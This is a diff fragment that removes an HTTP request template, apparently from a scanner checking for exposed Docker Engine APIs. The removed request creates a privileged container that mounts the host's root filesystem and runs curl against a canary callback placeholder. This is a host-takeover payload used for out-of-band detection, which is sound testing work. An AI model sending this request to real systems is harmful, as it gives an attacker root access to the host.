@@ -1,5 +1,0 @@
-POST /containers/create?name=test HTTP/1.1
-Host: {target_host}
-Content-Type: application/json
-
-{{\"Image\":\"alpine\", \"Cmd\":[\"/usr/bin/curl\", \"{canary_addr}\"], \"Binds\": [ \"/:/mnt\" ], \"Privileged\": true}}
